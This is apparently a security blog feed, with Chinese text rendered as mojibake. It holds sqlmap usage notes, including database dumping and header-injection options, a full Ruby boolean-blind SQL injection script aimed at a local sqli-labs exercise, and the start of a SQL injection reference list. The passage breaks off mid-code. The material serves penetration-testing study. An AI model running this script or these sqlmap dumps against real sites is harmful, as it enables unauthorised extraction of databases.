        <content type="html"><![CDATA[<ul><li><a href="https://vul-hunters.oschina.io/hunter-blogs/posts/sec-tools-sqlmap/">å‚æ•°ä»‹ç»</a></li><li><a href="https://github.com/sqlmapproject/sqlmap/wiki/Usage">å®˜ç½‘ä»‹ç»</a></li><li><a href="http://drops.xmd5.com/static/drops/tips-5254.html">sqlmap è¿›é˜¶ä½¿ç”¨</a></li></ul><h2 id="tamper"><a href="#tamper" class="headerlink" title="tamper"></a>tamper</h2><p>ä½¿ç”¨æ–¹æ³•ï¼š</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-css codeBlockLines"><span class="line">sqlmap -u <span class="hljs-selector-attr">[url]</span> --tamper <span class="hljs-selector-attr">[æ¨¡å—å]</span></span></code></pre></div></div><p><code>--list-tampers </code></p><ul><li><a href="https://xz.aliyun.com/t/2746">è¿™é‡Œ</a>æ˜¯tamperçš„å¸¸ç”¨è„šæœ¬</li><li>è‡ªå·±å†™tamperè„šæœ¬ï¼Œæ”¾åœ¨<code>/usr/share/sqlmap/tamper</code></li></ul><hr><ul><li>è¿‡é€—å·çš„æ¨¡å— <code>&quot;commalessmid,ifnull2casewhenisnull&quot;</code></li></ul><h2 id="å‰ç¼€-â€“prefix"><a href="#å‰ç¼€-â€“prefix" class="headerlink" title="å‰ç¼€ â€“prefix"></a>å‰ç¼€ â€“prefix</h2><p>å½“ç¢°åˆ°ç±»ä¼¼<code>sprint</code>æ¼æ´çš„æ—¶å€™ï¼Œä½¿ç”¨<code>--prefix</code>ä¿®æ”¹Payloadçš„å‰ç¼€<code>&#39;</code></p><ul><li><a href="https://paper.seebug.org/386/">è¿™ç¯‡</a>æ˜¯ä»‹ç»<code>sprint</code>æ¼æ´çš„<br>é€šè¿‡fuzzçš„æ–¹å¼å‘ç°<code>%</code>çš„è¿”å›å¤šå‡ºäº†å†…å®¹</li></ul><h2 id="sql-shell"><a href="#sql-shell" class="headerlink" title="--sql-shell"></a><code>--sql-shell</code></h2><ul><li><code>--sql-shell</code> é€šè¿‡ç”¨sqlè¯­å¥çš„æ–¹æ³•æŸ¥çœ‹æ•°æ®</li></ul><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-pgsql codeBlockLines"><span class="line"><span class="hljs-keyword">select</span> count(<span class="hljs-keyword">distinct</span> table_schema) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span>;</span><span class="line"></br></span><span class="line"><span class="hljs-keyword">select</span> group_concat(<span class="hljs-keyword">distinct</span> table_schema) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span>;</span><span class="line"></br></span><span class="line"><span class="hljs-keyword">select</span> group_concat(<span class="hljs-built_in">table_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;sqli&#x27;</span>;</span><span class="line"></br></span><span class="line"><span class="hljs-keyword">select</span> group_concat(<span class="hljs-built_in">column_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;sqli&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">table_name</span>=<span class="hljs-string">&#x27;users&#x27;</span>;</span></code></pre></div></div><h2 id="æ³¨å…¥ç±»å‹"><a href="#æ³¨å…¥ç±»å‹" class="headerlink" title="æ³¨å…¥ç±»å‹"></a>æ³¨å…¥ç±»å‹</h2><p>B: Boolean-based blind SQL injectionï¼ˆå¸ƒå°”å‹æ³¨å…¥ï¼‰<br>E: Error-based SQL injectionï¼ˆæŠ¥é”™å‹æ³¨å…¥ï¼‰<br>U: UNION query SQL injectionï¼ˆå¯è”åˆæŸ¥è¯¢æ³¨å…¥ï¼‰<br>S: Stacked queries SQL injectionï¼ˆå¯å¤šè¯­å¥æŸ¥è¯¢æ³¨å…¥ï¼‰<br>T: Time-based blind SQL injectionï¼ˆåŸºäºæ—¶é—´å»¶è¿Ÿæ³¨å…¥ï¼‰</p><h2 id="r"><a href="#r" class="headerlink" title="-r"></a><code>-r</code></h2><p>å¯ä»¥ç›´æ¥ä½¿ç”¨æ•´ä¸ªè¯·æ±‚åŒ…<br>æ³¨æ„é‡Œé¢æŠ¥å¤´ä¸èƒ½æœ‰ç©ºè¡Œï¼Œä»brupsuite ç›´æ¥å¤åˆ¶åˆ°vimä¼šæœ‰ç©ºè¡Œæ˜¯ä¸è¡Œçš„ï¼Œæ”¾åˆ°geditå†æ‹¿è¿‡æ¥å°±å¥½äº†ã€‚</p><p>æˆ–è€…<br><code>:g/^$/d</code></p><h2 id="æŒ‡å®šæ•°æ®åº“ï¼Œè¡¨ï¼Œæ¥è„±åº“"><a href="#æŒ‡å®šæ•°æ®åº“ï¼Œè¡¨ï¼Œæ¥è„±åº“" class="headerlink" title="æŒ‡å®šæ•°æ®åº“ï¼Œè¡¨ï¼Œæ¥è„±åº“"></a>æŒ‡å®šæ•°æ®åº“ï¼Œè¡¨ï¼Œæ¥è„±åº“</h2><p><code>-D &quot;security&quot; -T &quot;users&quot; --dump</code></p><h2 id="å¤´éƒ¨æ³¨å…¥æ£€æµ‹"><a href="#å¤´éƒ¨æ³¨å…¥æ£€æµ‹" class="headerlink" title="å¤´éƒ¨æ³¨å…¥æ£€æµ‹"></a>å¤´éƒ¨æ³¨å…¥æ£€æµ‹</h2><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-1c codeBlockLines"><span class="line">--level=<span class="hljs-number">2</span> <span class="hljs-comment">// Attack the Cookie header</span></span><span class="line">--level=<span class="hljs-number">3</span> <span class="hljs-comment">// Attack the User-Agent header, as well as the Referer header</span></span><span class="line">--level=<span class="hljs-number">5</span> <span class="hljs-comment">// Attack the Host header</span></span></code></pre></div></div><p>ä¸åœ¨åˆ—çš„å±æ€§åªç”¨åœ¨å¤´éƒ¨æ–‡ä»¶ä¸­ä½¿ç”¨<code>*</code> å°±å¯ä»¥äº†</p><ul><li><a href="https://www.okiok.com/sql-injection-http-headers-sqlmap/">å‚è€ƒ</a></li></ul><h2 id="æ¸…é™¤sessionï¼Œé‡æ–°æ‰«æ"><a href="#æ¸…é™¤sessionï¼Œé‡æ–°æ‰«æ" class="headerlink" title="æ¸…é™¤sessionï¼Œé‡æ–°æ‰«æ"></a>æ¸…é™¤sessionï¼Œé‡æ–°æ‰«æ</h2><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-brainfuck codeBlockLines"><span class="line">--<span class="hljs-comment">flush</span><span class="hljs-literal">-</span><span class="hljs-comment">session</span> --<span class="hljs-comment">fresh</span><span class="hljs-literal">-</span><span class="hljs-comment">queries</span></span></code></pre></div></div>]]></content>
      
      
      <categories>
          
          <category> æ¸—é€ </category>
          
          <category> çŸ¥è¯†ç‚¹ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GET å•å¼•å·ç›²æ³¨è„šæœ¬</title>
      <link href="/2021/12/31/GET-%E5%8D%95%E5%BC%95%E5%8F%B7%E7%9B%B2%E6%B3%A8%E8%84%9A%E6%9C%AC/"/>
      <url>/2021/12/31/GET-%E5%8D%95%E5%BC%95%E5%8F%B7%E7%9B%B2%E6%B3%A8%E8%84%9A%E6%9C%AC/</url>
      
        <content type="html"><![CDATA[<div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-ruby codeBlockLines"><span class="line"><span class="hljs-keyword">require</span> <span class="hljs-string">&#x27;net/http&#x27;</span></span><span class="line"><span class="hljs-keyword">require</span> <span class="hljs-string">&#x27;byebug&#x27;</span></span><span class="line"><span class="hljs-keyword">require</span> <span class="hljs-string">&#x27;pp&#x27;</span></span><span class="line"><span class="hljs-keyword">require</span> <span class="hljs-string">&#x27;./table&#x27;</span></span><span class="line"></br></span><span class="line"></br></span><span class="line"><span class="hljs-comment"># select * from users where id = &#x27;1&#x27; and length((select database())) &gt; 5;</span></span><span class="line"><span class="hljs-comment"># select * from users where id = &#x27;1&#x27; and ord(substr((select database()),1,1)) &gt; 40;</span></span><span class="line"></br></span><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Inject</span></span></span><span class="line"></br></span><span class="line">  URL = <span class="hljs-string">&#x27;http://localhost/Sqli_Edited_Version/sqlilabs/Less-8/?id=1&#x27;</span></span><span class="line"></br></span><span class="line">  SelectDatabase  = <span class="hljs-string">&#x27;select database()&#x27;</span></span><span class="line">  SelectTables = <span class="hljs-string">&quot;select table_name from information_schema.tables where table_schema = &#x27;%s&#x27; limit %d,1&quot;</span></span><span class="line"></br></span><span class="line">  SelectColumns = <span class="hljs-string">&quot;select group_concat(column_name) from information_schema.columns where table_name = &#x27;%s&#x27; and table_schema = &#x27;%s&#x27; limit 0,1&quot;</span></span><span class="line"></br></span><span class="line">  SelectData = <span class="hljs-string">&quot;select concat_ws(&#x27;,&#x27;,%s) from %s limit %d,1&quot;</span></span><span class="line"></br></span><span class="line">  LengthPayload   = <span class="hljs-string">&quot;&#x27; and length((%s)) &gt; %d&quot;</span></span><span class="line">  SubstrPayload = <span class="hljs-string">&quot;&#x27; and ord(substr((%s),%d,1)) &gt; %d&quot;</span></span><span class="line"></br></span><span class="line">  Note = <span class="hljs-string">&#x27; +--+&#x27;</span></span><span class="line"></br></span><span class="line">  Key = <span class="hljs-string">&#x27;You are in...........&#x27;</span></span><span class="line"></br></span><span class="line">  <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">initialize</span></span></span><span class="line">    <span class="hljs-variable">@url</span> = URI(URL)</span><span class="line">    <span class="hljs-variable">@http</span> = Net::HTTP</span><span class="line">    <span class="hljs-variable">@info</span> = &#123;&#125;</span><span class="line">  <span class="hljs-keyword">end</span></span><span class="line"></br></span><span class="line">  <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">inject</span></span></span><span class="line">    data_len = get_length(SelectDatabase)</span><span class="line">    <span class="hljs-comment">#puts &quot;Database Length: #&#123;data_len&#125;&quot;</span></span><span class="line"></br></span><span class="line">    data_name = get_name(SelectDatabase, data_len)</span><span class="line">    puts <span class="hljs-string">&quot;Database Name: <span class="hljs-subst">#&#123;data_name&#125;</span>&quot;</span></span><span class="line">    <span class="hljs-variable">@info</span>[<span class="hljs-symbol">:database</span>] = data_name</span><span class="line"></br></span><span class="line"></br></span><span class="line">    <span class="hljs-comment"># Tables Name</span></span><span class="line">    n = <span class="hljs-number">0</span></span><span class="line">    <span class="hljs-variable">@info</span>[<span class="hljs-symbol">:tables</span>] = &#123;&#125;</span><span class="line">    loop <span class="hljs-keyword">do</span></span><span class="line">      select_table_name = format(SelectTables, data_name, n)</span><span class="line">      len = get_length(select_table_name)</span><span class="line"></br></span><span class="line">      <span class="hljs-comment"># å½“lenä¸ºfalseæ—¶é€€å‡º</span></span><span class="line">      <span class="hljs-keyword">break</span> <span class="hljs-keyword">unless</span> len</span><span class="line"></br></span><span class="line">      <span class="hljs-comment">#puts &quot;Table #&#123;n&#125; Length: #&#123;len&#125;&quot;</span></span><span class="line">      puts select_table_name</span><span class="line"></br></span><span class="line">      table_name = get_name(select_table_name, len)</span><span class="line">      puts <span class="hljs-string">&quot;Table <span class="hljs-subst">#&#123;n&#125;</span> Name: <span class="hljs-subst">#&#123;table_name&#125;</span>&quot;</span></span><span class="line">      <span class="hljs-variable">@info</span>[<span class="hljs-symbol">:tables</span>][table_name] = &#123;&#125;</span><span class="line"></br></span><span class="line">      n += <span class="hljs-number">1</span></span><span class="line">    <span class="hljs-keyword">end</span></span><span class="line"></br></span><span class="line">    <span class="hljs-comment"># Columns</span></span><span class="line">    <span class="hljs-variable">@info</span>[<span class="hljs-symbol">:tables</span>].each_pair <span class="hljs-keyword">do</span> <span class="hljs-params">|tb_name, _|</span></span><span class="line"></br></span><span class="line">      select_columns = format(SelectColumns, tb_name, <span class="hljs-variable">@info</span>[<span class="hljs-symbol">:database</span>])</span><span class="line">      len = get_length(select_columns)</span><span class="line"></br></span><span class="line">      <span class="hljs-keyword">break</span> <span class="hljs-keyword">unless</span> len</span><span class="line"></br></span><span class="line">      puts select_columns</span><span class="line"></br></span><span class="line">      concat_columns = get_name(select_columns, len)</span><span class="line">      columns = concat_columns.split(<span class="hljs-string">&quot;,&quot;</span>)</span><span class="line">      <span class="hljs-variable">@info</span>[<span class="hljs-symbol">:tables</span>][tb_name][<span class="hljs-symbol">:columns</span>] = columns</span><span class="line">    <span class="hljs-keyword">end</span></span><span class="line"></br></span><span class="line">    <span class="hljs-comment"># Data</span></span><span class="line">    <span class="hljs-variable">@info</span>[<span class="hljs-symbol">:tables</span>].each_pair <span class="hljs-keyword">do</span> <span class="hljs-params">|tb_name, hs|</span></span><span class="line"></br></span><span class="line">      columns = hs[<span class="hljs-symbol">:columns</span>]</span><span class="line">      n = <span class="hljs-number">0</span></span><span class="line">      <span class="hljs-variable">@info</span>[<span class="hljs-symbol">:tables</span>][tb_name][<span class="hljs-symbol">:data</span>] = []</span><span class="line">      loop <span class="hljs-keyword">do</span></span><span class="line">        cs = columns.join(<span class="hljs-string">&#x27;,&#x27;</span>)</span><span class="line">        select_data = format(SelectData, cs, tb_name, n)</span><span class="line"></br></span><span class="line">        len = get_length(select_data)</span><span class="line"></br></span><span class="line">        <span class="hljs-keyword">break</span> <span class="hljs-keyword">unless</span> len</span><span class="line"></br></span><span class="line">        puts select_data</span><span class="line"></br></span><span class="line">        concat_data = get_name(select_data, len)</span><span class="line">        <span class="hljs-variable">@info</span>[<span class="hljs-symbol">:tables</span>][tb_name][<span class="hljs-symbol">:data</span>] &lt;&lt; concat_data.split(<span class="hljs-string">&#x27;,&#x27;</span>)</span><span class="line"></br></span><span class="line">        n += <span class="hljs-number">1</span></span><span class="line">      <span class="hljs-keyword">end</span></span><span class="line">    <span class="hljs-keyword">end</span></span><span class="line"></br></span><span class="line">    dump_data</span><span class="line">  <span class="hljs-keyword">end</span></span><span class="line"></br></span><span class="line">  <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">dump_data</span><span class="hljs-params">(indent=<span class="hljs-number">2</span>)</span></span></span><span class="line"></br></span><span class="line">    <span class="hljs-variable">@info</span>[<span class="hljs-symbol">:tables</span>].each_pair <span class="hljs-keyword">do</span> <span class="hljs-params">|tb_name, hash|</span></span><span class="line"></br></span><span class="line">      col = hash[<span class="hljs-symbol">:columns</span>]</span><span class="line">      table = Table.new(</span><span class="line">        <span class="hljs-string">&#x27;Header&#x27;</span>=&gt; <span class="hljs-string">&quot;<span class="hljs-subst">#&#123;tb_name&#125;</span> Table&quot;</span>,</span><span class="line">        <span class="hljs-string">&#x27;Indent&#x27;</span>=&gt; indent,</span><span class="line">        <span class="hljs-string">&#x27;Columns&#x27;</span>=&gt; col,</span><span class="line">        <span class="hljs-string">&#x27;CellPad&#x27;</span>=&gt; <span class="hljs-number">2</span>,</span><span class="line">        <span class="hljs-string">&#x27;SortIndex&#x27;</span>=&gt; <span class="hljs-number">2</span>)</span><span class="line"></br></span><span class="line">      hash[<span class="hljs-symbol">:data</span>].each <span class="hljs-keyword">do</span> <span class="hljs-params">|data|</span></span><span class="line">        table &lt;&lt; data</span><span class="line">      <span class="hljs-keyword">end</span></span><span class="line"></br></span><span class="line">      puts table.to_s + <span class="hljs-string">&quot;\n&quot;</span></span><span class="line">    <span class="hljs-keyword">end</span></span><span class="line"></br></span><span class="line">  <span class="hljs-keyword">end</span></span><span class="line"></br></span><span class="line">  <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">send</span><span class="hljs-params">(payload)</span></span></span><span class="line">    url = URI(URL + payload + Note)</span><span class="line">    <span class="hljs-variable">@http</span>.get_response(url)</span><span class="line">  <span class="hljs-keyword">end</span></span><span class="line"></br></span><span class="line">  <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_result</span><span class="hljs-params">(payload)</span></span></span><span class="line">    response = send(payload)</span><span class="line">    response.body.<span class="hljs-keyword">include</span>?(Key)</span><span class="line">  <span class="hljs-keyword">end</span></span><span class="line"></br></span><span class="line">  <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">length_payload</span><span class="hljs-params">(payload, len)</span></span></span><span class="line">    format(LengthPayload, payload, len)</span><span class="line">  <span class="hljs-keyword">end</span></span><span class="line"></br></span><span class="line">  <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_length</span><span class="hljs-params">(payload, str=<span class="hljs-literal">nil</span>)</span></span></span><span class="line">    length_left = <span class="hljs-number">0</span></span><span class="line">    length_right = <span class="hljs-number">0</span></span><span class="line"></br></span><span class="line">    guess = <span class="hljs-number">5</span></span><span class="line"></br></span><span class="line">    <span class="hljs-comment"># é¦–å…ˆç¡®å®šå¯èƒ½çš„æœ€é•¿é•¿åº¦å’Œæœ€çŸ­é•¿åº¦</span></span><span class="line">    loop <span class="hljs-keyword">do</span></span><span class="line">      <span class="hljs-keyword">if</span> get_result( length_payload(payload, length_right) )</span><span class="line">        length_right += guess</span><span class="line"></br></span><span class="line">      <span class="hljs-keyword">else</span></span><span class="line">        length_left   = length_right - guess</span><span class="line">        <span class="hljs-keyword">break</span></span><span class="line">      <span class="hljs-keyword">end</span></span><span class="line">    <span class="hljs-keyword">end</span></span><span class="line"></br></span><span class="line">    <span class="hljs-comment"># å½“æ²¡æœ‰å†…å®¹çš„æ—¶å€™è¿”å›é”™è¯¯</span></span><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span> <span class="hljs-keyword">if</span> length_right.zero?</span><span class="line"></br></span><span class="line">    <span class="hljs-comment"># ç²¾ç¡®åˆ¤æ–­é•¿åº¦</span></span><span class="line">    <span class="hljs-keyword">while</span> length_left &lt; (length_right - <span class="hljs-number">1</span>)</span><span class="line">      mid = (length_left + length_right) / <span class="hljs-number">2</span></span><span class="line"></br></span><span class="line">      <span class="hljs-comment"># åˆ¤æ–­ä¸­é—´é•¿åº¦æ˜¯å¦ä¸ºçœŸ</span></span><span class="line">      <span class="hljs-keyword">if</span> get_result( length_payload(payload, mid) )</span><span class="line">        length_left = mid</span><span class="line"></br></span><span class="line">      <span class="hljs-keyword">else</span></span><span class="line">        length_right = mid</span><span class="line">      <span class="hljs-keyword">end</span></span><span class="line">    <span class="hljs-keyword">end</span></span><span class="line"></br></span><span class="line">    <span class="hljs-keyword">return</span> length_right</span><span class="line">  <span class="hljs-keyword">end</span></span><span class="line"></br></span><span class="line">  <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_name</span><span class="hljs-params">(payload, len)</span></span></span><span class="line">    name = <span class="hljs-string">&quot;&quot;</span></span><span class="line"></br></span><span class="line">    len.times <span class="hljs-keyword">do</span> <span class="hljs-params">|n|</span></span><span class="line">      n += <span class="hljs-number">1</span></span><span class="line">      ascii = get_name_char( payload, n )</span><span class="line">      name &lt;&lt; ascii.chr</span><span class="line">    <span class="hljs-keyword">end</span></span><span class="line"></br></span><span class="line">    <span class="hljs-keyword">return</span> name</span><span class="line">  <span class="hljs-keyword">end</span></span><span class="line"></br></span><span class="line">  <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">name_payload</span><span class="hljs-params">(payload, pos, test)</span></span></span><span class="line">    format(SubstrPayload, payload, pos, test)</span><span class="line">  <span class="hljs-keyword">end</span></span><span class="line"></br></span><span class="line">  <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_name_char</span><span class="hljs-params">(payload, pos)</span></span></span><span class="line">    left  = <span class="hljs-number">0</span></span><span class="line">    right = <span class="hljs-number">0</span></span><span class="line"></br></span><span class="line">    guess = <span class="hljs-number">10</span></span><span class="line"></br></span><span class="line">    loop <span class="hljs-keyword">do</span></span><span class="line">      <span class="hljs-keyword">if</span> get_result( name_payload(payload, pos, right) )</span><span class="line">        right += guess</span><span class="line"></br></span><span class="line">      <span class="hljs-keyword">else</span></span><span class="line">        left = right - guess</span><span class="line">        <span class="hljs-keyword">break</span></span><span class="line">      <span class="hljs-keyword">end</span></span><span class="line">    <span class="hljs-keyword">end</span></span><span class="line"></br></span><span class="line">    <span class="hljs-keyword">while</span> left &lt; (right - <span class="hljs-number">1</span>)</span><span class="line">      mid = (left + right) / <span class="hljs-number">2</span></span><span class="line"></br></span><span class="line">      <span class="hljs-keyword">if</span> get_result( name_payload(payload, pos, mid) )</span><span class="line">        left = mid</span><span class="line"></br></span><span class="line">      <span class="hljs-keyword">else</span></span><span class="line">        right = mid</span><span class="line">      <span class="hljs-keyword">end</span></span><span class="line">    <span class="hljs-keyword">end</span></span><span class="line"></br></span><span class="line">    <span class="hljs-keyword">return</span> right</span><span class="line">  <span class="hljs-keyword">end</span></span><span class="line"></br></span><span class="line"><span class="hljs-keyword">end</span></span><span class="line"></br></span><span class="line">inject = Inject.new</span><span class="line">inject.inject</span></code></pre></div></div>]]></content>
      
      
      <categories>
          
          <category> æ¸—é€ </category>
          
          <category> è„šæœ¬æ”¶é›† </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sql æ³¨å…¥</title>
      <link href="/2021/12/31/sql-%E6%B3%A8%E5%85%A5/"/>
      <url>/2021/12/31/sql-%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h2 id="æ–‡ç« æ”¶é›†"><a href="#æ–‡ç« æ”¶é›†" class="headerlink" title="æ–‡ç« æ”¶é›†"></a>æ–‡ç« æ”¶é›†</h2><ul><li><a href="https://www.bugbank.cn/q/article/58afc3c06ef394d12a8a4379.html">bugbankä¸Šæ±‡æ€»</a></li><li><a href="http://www.aneasystone.com/archives/2014/09/all-input-is-evil-sql-injection.html">æ‰€æœ‰ç”¨æˆ·çš„è¾“å…¥éƒ½æ˜¯é‚ªæ¶çš„</a></li><li><a href="https://blog.csdn.net/chengxuyuanyonghu/article/details/40078181">information_schemaè¡¨</a></li><li><a href="https://segmentfault.com/a/1190000007520556">Sqlæ³¨å…¥è¯¦è§£</a></li><li><a href="https://www.bugbank.cn/q/article/5983ea82cbb936102d3977bb.html">Sqlæ³¨å…¥ï¼ˆæ•°å­—å‹ï¼‰</a></li><li><a href="https://blog.spoock.com/2016/06/28/sql-injection-1/">SQLæ³¨å…¥å¿…å¤‡çŸ¥è¯†</a> è¿™é‡Œé¢æ¶µç›–äº†åŸºæœ¬æ‰€æœ‰åº”è¯¥çŸ¥é“çš„ä¿¡æ¯ï¼Œåœ¨æ–‡ç« é‡ŒæŸ¥ä¸åˆ°çš„æ¥è¿™é‡ŒæŸ¥</li><li><a href="https://www.jianshu.com/p/399881e79b1f">è”åˆæŸ¥è¯¢</a></li></ul><h2 id="åŸºæœ¬showå‘½ä»¤"><a href="#åŸºæœ¬showå‘½ä»¤" class="headerlink" title="åŸºæœ¬showå‘½ä»¤"></a>åŸºæœ¬showå‘½ä»¤</h2><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-sql codeBlockLines"><span class="line"><span class="hljs-keyword">show</span> tablesæˆ–<span class="hljs-keyword">show</span> tables <span class="hljs-keyword">from</span> database_name; <span class="hljs-operator">/</span><span class="hljs-operator">/</span> æ˜¾ç¤ºå½“å‰æ•°æ®åº“ä¸­æ‰€æœ‰è¡¨çš„åç§°</span><span class="line"></br></span><span class="line"><span class="hljs-keyword">show</span> databases; <span class="hljs-operator">/</span><span class="hljs-operator">/</span> æ˜¾ç¤ºmysqlä¸­æ‰€æœ‰æ•°æ®åº“çš„åç§°</span><span class="line"></br></span><span class="line"><span class="hljs-keyword">show</span> columns <span class="hljs-keyword">from</span> table_name <span class="hljs-keyword">from</span> database_name; </span><span class="line">æˆ–MySQL <span class="hljs-keyword">show</span> columns <span class="hljs-keyword">from</span> database_name.table_name; <span class="hljs-operator">/</span><span class="hljs-operator">/</span> æ˜¾ç¤ºè¡¨ä¸­åˆ—åç§°</span><span class="line"></br></span><span class="line"><span class="hljs-keyword">show</span> grants <span class="hljs-keyword">for</span> user_name<span class="hljs-variable">@localhost</span>; <span class="hljs-operator">/</span><span class="hljs-operator">/</span> æ˜¾ç¤ºä¸€ä¸ªç”¨æˆ·çš„æƒé™ï¼Œæ˜¾ç¤ºç»“æœç±»ä¼¼äº<span class="hljs-keyword">grant</span> å‘½ä»¤</span><span class="line"></br></span><span class="line"><span class="hljs-keyword">show</span> index <span class="hljs-keyword">from</span> table_name; <span class="hljs-operator">/</span><span class="hljs-operator">/</span> æ˜¾ç¤ºè¡¨çš„ç´¢å¼•</span><span class="line"></br></span><span class="line"><span class="hljs-keyword">show</span> status; <span class="hljs-operator">/</span><span class="hljs-operator">/</span> æ˜¾ç¤ºä¸€äº›ç³»ç»Ÿç‰¹å®šèµ„æºçš„ä¿¡æ¯ï¼Œä¾‹å¦‚ï¼Œæ­£åœ¨è¿è¡Œçš„çº¿ç¨‹æ•°é‡</span><span class="line"></br></span><span class="line"><span class="hljs-keyword">show</span> variables; <span class="hljs-operator">/</span><span class="hljs-operator">/</span> æ˜¾ç¤ºç³»ç»Ÿå˜é‡çš„åç§°å’Œå€¼</span><span class="line"></br></span><span class="line"><span class="hljs-keyword">show</span> processlist; <span class="hljs-operator">/</span><span class="hljs-operator">/</span> æ˜¾ç¤ºç³»ç»Ÿä¸­æ­£åœ¨è¿è¡Œçš„æ‰€æœ‰è¿›ç¨‹ï¼Œä¹Ÿå°±æ˜¯å½“å‰æ­£åœ¨æ‰§è¡Œçš„æŸ¥è¯¢ã€‚å¤§å¤šæ•°ç”¨æˆ·å¯ä»¥æŸ¥çœ‹</span><span class="line"></br></span><span class="line">ä»–ä»¬è‡ªå·±çš„è¿›ç¨‹ï¼Œä½†æ˜¯å¦‚æœä»–ä»¬æ‹¥æœ‰processæƒé™ï¼Œå°±å¯ä»¥æŸ¥çœ‹æ‰€æœ‰äººçš„è¿›ç¨‹ï¼ŒåŒ…æ‹¬å¯†ç ã€‚</span><span class="line"></br></span><span class="line">MySQL <span class="hljs-keyword">show</span> <span class="hljs-keyword">table</span> status; <span class="hljs-operator">/</span><span class="hljs-operator">/</span> æ˜¾ç¤ºå½“å‰ä½¿ç”¨æˆ–è€…æŒ‡å®šçš„databaseä¸­çš„æ¯ä¸ªè¡¨çš„ä¿¡æ¯ã€‚ä¿¡æ¯åŒ…æ‹¬è¡¨ç±»å‹å’Œè¡¨çš„<span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span>æ›´æ–°æ—¶é—´</span><span class="line"></br></span><span class="line"><span class="hljs-keyword">show</span> privileges; <span class="hljs-operator">/</span><span class="hljs-operator">/</span> æ˜¾ç¤ºæœåŠ¡å™¨æ‰€æ”¯æŒçš„ä¸åŒæƒé™</span><span class="line"></br></span><span class="line"><span class="hljs-keyword">show</span> <span class="hljs-keyword">create</span> database database_name; <span class="hljs-operator">/</span><span class="hljs-operator">/</span> æ˜¾ç¤º<span class="hljs-keyword">create</span> database è¯­å¥æ˜¯å¦èƒ½å¤Ÿåˆ›å»ºæŒ‡å®šçš„æ•°æ®åº“</span><span class="line"></br></span><span class="line"><span class="hljs-keyword">show</span> <span class="hljs-keyword">create</span> <span class="hljs-keyword">table</span> table_name; <span class="hljs-operator">/</span><span class="hljs-operator">/</span> æ˜¾ç¤º<span class="hljs-keyword">create</span> database è¯­å¥æ˜¯å¦èƒ½å¤Ÿåˆ›å»ºæŒ‡å®šçš„æ•°æ®åº“</span><span class="line"></br></span><span class="line"><span class="hljs-keyword">show</span> engies; <span class="hljs-operator">/</span><span class="hljs-operator">/</span> æ˜¾ç¤ºå®‰è£…ä»¥åå¯ç”¨çš„å­˜å‚¨å¼•æ“å’Œé»˜è®¤å¼•æ“ã€‚</span><span class="line"></br></span><span class="line"><span class="hljs-keyword">show</span> innodb status; <span class="hljs-operator">/</span><span class="hljs-operator">/</span> æ˜¾ç¤ºinnoDBå­˜å‚¨å¼•æ“çš„çŠ¶æ€</span><span class="line"></br></span><span class="line"><span class="hljs-keyword">show</span> logs; <span class="hljs-operator">/</span><span class="hljs-operator">/</span> æ˜¾ç¤ºBDBå­˜å‚¨å¼•æ“çš„æ—¥å¿—</span><span class="line"></br></span><span class="line">MySQL <span class="hljs-keyword">show</span> warnings; <span class="hljs-operator">/</span><span class="hljs-operator">/</span> æ˜¾ç¤º<span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span>ä¸€ä¸ªæ‰§è¡Œçš„è¯­å¥æ‰€äº§ç”Ÿçš„é”™è¯¯ã€è­¦å‘Šå’Œé€šçŸ¥</span><span class="line"></br></span><span class="line"><span class="hljs-keyword">show</span> errors; <span class="hljs-operator">/</span><span class="hljs-operator">/</span> åªæ˜¾ç¤º<span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span>ä¸€ä¸ªæ‰§è¡Œè¯­å¥æ‰€äº§ç”Ÿçš„é”™è¯¯</span></code></pre></div></div><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-pgsql codeBlockLines"><span class="line"><span class="hljs-keyword">select</span> count(<span class="hljs-keyword">distinct</span> table_schema) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span>;</span><span class="line"></br></span><span class="line"><span class="hljs-keyword">select</span> group_concat(<span class="hljs-keyword">distinct</span> table_schema) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span>;</span><span class="line"></br></span><span class="line"><span class="hljs-keyword">select</span> group_concat(<span class="hljs-built_in">table_name</span>) <span class="hljs-keyword">from</span> information_schema.<span 